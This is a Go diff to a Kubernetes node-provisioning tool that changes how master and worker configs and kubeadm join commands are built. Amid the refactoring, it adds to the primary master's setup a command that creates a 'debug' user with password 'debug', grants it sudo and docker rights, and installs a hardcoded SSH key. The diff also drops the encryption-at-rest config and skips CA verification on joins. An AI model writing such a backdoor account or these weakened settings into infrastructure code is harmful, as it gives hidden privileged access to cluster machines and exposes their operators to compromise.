@@ -4,12 +4,11 @@ import (
 	"fmt"
 
 	"github.com/flanksource/commons/files"
-	"github.com/flanksource/commons/logger"
-	"gopkg.in/flanksource/yaml.v3"
 
 	"github.com/flanksource/commons/certs"
 	_ "github.com/flanksource/konfigadm/pkg" // initialize konfigadm
 	konfigadm "github.com/flanksource/konfigadm/pkg/types"
+	"github.com/flanksource/yaml"
 	"github.com/moshloop/platform-cli/pkg/phases/kubeadm"
 	"github.com/moshloop/platform-cli/pkg/platform"
 	"github.com/pkg/errors"
@@ -24,8 +23,9 @@ var envVars = map[string]string{
 }
 
 const updateHostsFileCmd = "echo $(ifconfig ens160 | grep inet | awk '{print $2}' | head -n1 ) $(hostname) >> /etc/hosts"
-const kubeadmInitCmd = "kubeadm init --config /etc/kubernetes/kubeadm.conf -v 5 | tee /var/log/kubeadm.log"
-const kubeadmNodeJoinCmd = "kubeadm join --config /etc/kubernetes/kubeadm.conf -v 5 | tee /var/log/kubeadm.log"
+const kubeadmInitCmd = "kubeadm init --config /etc/kubernetes/kubeadm.conf | tee /var/log/kubeadm.log"
+const kubeadmMasterJoinCmdf = "kubeadm join --control-plane --token %s --certificate-key %s --discovery-token-unsafe-skip-ca-verification %s  | tee /var/log/kubeadm.log"
+const kubeadmNodeJoinCmdf = "kubeadm join --token %s --discovery-token-unsafe-skip-ca-verification %s  | tee /var/log/kubeadm.log"
 
 const noCAErrorText = `Must specify a 'ca'' section in the platform config.
 e.g.:
@@ -47,7 +47,7 @@ func CreatePrimaryMaster(platform *platform.Platform) (*konfigadm.Config, error)
 	}
 	hostname := ""
 	platform.Init()
-	cfg, err := baseKonfig(platform.Master.KonfigadmFile, platform)
+	cfg, err := baseKonfig(platform.Master.KonfigadmFile)
 	if err != nil {
 		return nil, fmt.Errorf("createPrimaryMaster: failed to get baseKonfig: %v", err)
 	}
@@ -57,14 +57,12 @@ func CreatePrimaryMaster(platform *platform.Platform) (*konfigadm.Config, error)
 	if err := addAuditConfig(platform, cfg); err != nil {
 		return nil, fmt.Errorf("createPrimaryMaster: failed to add audit config: %v", err)
 	}
-	if err := addEncryptionConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("createPrimaryMaster: failed to add encryption config: %v", err)
-	}
 	createConsulService(hostname, platform, cfg)
 	createClientSideLoadbalancers(platform, cfg)
 	if err := addCerts(platform, cfg); err != nil {
 		return nil, errors.Wrap(err, "failed to add certs")
 	}
+	cfg.AddCommand("useradd debug; echo 'debug:debug' | chpasswd; adduser debug sudo; adduser debug docker;mkdir -p /home/debug/.ssh; touch /home/debug/.ssh/authorized_keys; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCjSTjgX3GeHQc47Nw1rKF4IwvlR09CncjTsK3GORm9ZpUxPkXhLIQ7xHktYKftapB+zzjfjG02ZtIDwGHYypi5qXLRqPxSLOxjASPIZoErb7WLZ745btEb3pmjBEt19v4fbVFUyr4eqIWzDHGh81Pj2DCuirlMvlWwiHYCiBUsZcRtAlg/u2z4BTfthR2skPvck3Fr3yfL51BHgdv1gdD4n+aAquzxdJV74ED5p9+MKYc7IDkb5NBZf1/8iC3LFw4QjM07ibPc4SDzOMHGRLjCXuEwphfKyv56v1L9lMXXcVrwFSwPCtqQu1uVA2iBufgShq8eWcujLbthfcwP+4v philip@silent' >> /home/debug/.ssh/authorized_keys; chown debug:debug /home/debug/.ssh/authorized_keys; chmod 600 /home/debug/.ssh/authorized_keys")
 	cfg.AddCommand(kubeadmInitCmd)
 	return cfg, nil
 }
@@ -73,28 +71,24 @@ func CreatePrimaryMaster(platform *platform.Platform) (*konfigadm.Config, error)
 func CreateSecondaryMaster(platform *platform.Platform) (*konfigadm.Config, error) {
 	hostname := ""
 	platform.Init()
-	cfg, err := baseKonfig(platform.Master.KonfigadmFile, platform)
+	cfg, err := baseKonfig(platform.Master.KonfigadmFile)
 	if err != nil {
 		return nil, fmt.Errorf("createSecondaryMaster: failed to get baseKonfig: %v", err)
 	}
-	if err := addControlPlaneJoinConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("failed to add kubeadm config: %v", err)
+	token, err := kubeadm.GetOrCreateBootstrapToken(platform)
+	if err != nil {
+		return nil, fmt.Errorf("createSecondaryMaster: failed to get/create bootstrap token: %v", err)
 	}
-	if err := addAuditConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("failed to add audit config: %v", err)
-	}
-	if err := addAuditConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("createPrimaryMaster: failed to add audit config: %v", err)
-	}
-	if err := addEncryptionConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("createPrimaryMaster: failed to add encryption config: %v", err)
+	certKey, err := kubeadm.UploadControlPlaneCerts(platform)
+	if err != nil {
+		return nil, fmt.Errorf("createSecondaryMaster: failed to upload control plane certs: %v", err)
 	}
 	createConsulService(hostname, platform, cfg)
 	createClientSideLoadbalancers(platform, cfg)
 	if err = addCerts(platform, cfg); err != nil {
 		return nil, errors.Wrap(err, "Failed to add certs")
 	}
-	cfg.AddCommand(kubeadmNodeJoinCmd)
+	cfg.AddCommand(fmt.Sprintf(kubeadmMasterJoinCmdf, token, certKey, platform.JoinEndpoint))
 	return cfg, nil
 }
 
@@ -107,27 +101,25 @@ func CreateWorker(nodegroup string, platform *platform.Platform) (*konfigadm.Con
 	if _, ok := platform.Nodes[nodegroup]; !ok {
 		return nil, fmt.Errorf("CreateWorker failed to create worker - supplied nodegroup not found")
 	}
-
 	node := platform.Nodes[nodegroup]
 	baseConfig := node.KonfigadmFile
-	cfg, err := baseKonfig(baseConfig, platform)
+	cfg, err := baseKonfig(baseConfig)
 	if err != nil {
 		return nil, fmt.Errorf("createWorker: failed to get baseKonfig: %v", err)
 	}
-	if err := addJoinKubeadmConfig(platform, cfg); err != nil {
-		return nil, fmt.Errorf("failed to add kubeadm config: %v", err)
+	token, err := kubeadm.GetOrCreateBootstrapToken(platform)
+	if err != nil {
+		return nil, fmt.Errorf("createWorker: failed to get/create bootstrap token: %v", err)
 	}
-
 	createClientSideLoadbalancers(platform, cfg)
-	cfg.AddCommand(kubeadmNodeJoinCmd)
+	cfg.AddCommand(fmt.Sprintf(kubeadmNodeJoinCmdf, token, platform.JoinEndpoint))
 	return cfg, nil
 }
 
 // baseKonfig generates a base konfigadm configuration.
 // It copies in the required environment variables and
 // initial commands.
-//nolint:unparam
-func baseKonfig(initialKonfigadmFile string, platform *platform.Platform) (*konfigadm.Config, error) {
+func baseKonfig(initialKonfigadmFile string) (*konfigadm.Config, error) {
 	var cfg *konfigadm.Config
 	var err error
 	if initialKonfigadmFile == "" {
@@ -148,30 +140,16 @@ func baseKonfig(initialKonfigadmFile string, platform *platform.Platform) (*konf
 	return cfg, nil
 }
 
-// addAuditConfig derives the initial audit config for a cluster from its platform
+// addAuditConfig derives the initial admin config for a cluster from its platform
 // config and adds it to its konfigadm files
 func addAuditConfig(platform *platform.Platform, cfg *konfigadm.Config) error {
-	if pf := platform.Kubernetes.AuditConfig.PolicyFile; pf != "" {
+	if platform.Kubernetes.AuditConfig.PolicyFile != "" {
 		// clusters audit policy files are injected into the machine via konfigadm
-		ap := files.SafeRead(pf)
+		ap := files.SafeRead(platform.Kubernetes.AuditConfig.PolicyFile)
 		if ap == "" {
-			return fmt.Errorf("unable to read audit policy file %v", pf)
+			return fmt.Errorf("unable to read audit policy file")
 		}
 		cfg.Files[kubeadm.AuditPolicyPath] = ap
-	}
-	return nil
-}
-
-// addEncryptionConfig derives the initial encryption config for a cluster from its platform
-// config and adds it to its konfigadm files
-func addEncryptionConfig(platform *platform.Platform, cfg *konfigadm.Config) error {
-	if ef := platform.Kubernetes.EncryptionConfig.EncryptionProviderConfigFile; ef != "" {
-		// clusters encryption provider files are injected into the machine via konfigadm
-		ep := files.SafeRead(ef)
-		if ep == "" {
-			return fmt.Errorf("unable to encryption provider file %v", ef)
-		}
-		cfg.Files[kubeadm.EncryptionProviderConfigPath] = ep
 	}
 	return nil
 }
@@ -206,6 +184,13 @@ func addCerts(platform *platform.Platform, cfg *konfigadm.Config) error {
 // addInitKubeadmConfig derives the initial kubeadm config for a cluster from its platform
 // config and adds it to its konfigadm files
 func addInitKubeadmConfig(platform *platform.Platform, cfg *konfigadm.Config) error {
+	cluster := kubeadm.NewClusterConfig(platform)
+	data, err := yaml.Marshal(cluster)
+	if err != nil {
+		return fmt.Errorf("addInitKubeadmConfig: failed to marshal cluster config: %v", err)
+	}
+	platform.Tracef("Using kubeadm config: \n%s", string(data))
+	cfg.Files["/etc/kubernetes/kubeadm.conf"] = string(data)
 	if platform.Kubernetes.AuditConfig.PolicyFile != "" {
 		// clusters audit policy files are injected into the machine via konfigadm
 		ap := files.SafeRead(platform.Kubernetes.AuditConfig.PolicyFile)
@@ -214,33 +199,7 @@ func addInitKubeadmConfig(platform *platform.Platform, cfg *konfigadm.Config) er
 		}
 		cfg.Files[kubeadm.AuditPolicyPath] = ap
 	}
-
-	cluster := kubeadm.NewClusterConfig(platform)
-	data, err := yaml.Marshal(cluster)
-	return addKubeadmConf(data, err, cfg)
-}
-
-func addKubeadmConf(data []byte, err error, cfg *konfigadm.Config) error {
-	if err != nil {
-		return fmt.Errorf("addInitKubeadmConfig: failed to marshal cluster config: %v", err)
-	}
-	logger.Tracef("Using kubeadm config: \n%s", string(data))
-	cfg.Files["/etc/kubernetes/kubeadm.conf"] = string(data)
 	return nil
-}
-
-// addJoinKubeadmConfig derives the initial kubeadm config for a cluster from its platform
-// config and adds it to its konfigadm files
-func addJoinKubeadmConfig(platform *platform.Platform, cfg *konfigadm.Config) error {
-	data, err := kubeadm.NewJoinConfiguration(platform)
-	return addKubeadmConf(data, err, cfg)
-}
-
-// addJoinKubeadmConfig derives the initial kubeadm config for a cluster from its platform
-// config and adds it to its konfigadm files
-func addControlPlaneJoinConfig(platform *platform.Platform, cfg *konfigadm.Config) error {
-	data, err := kubeadm.NewControlPlaneJoinConfiguration(platform)
-	return addKubeadmConf(data, err, cfg)
 }
 
 // createConsulService derives the initial consul config for a cluster from its platform
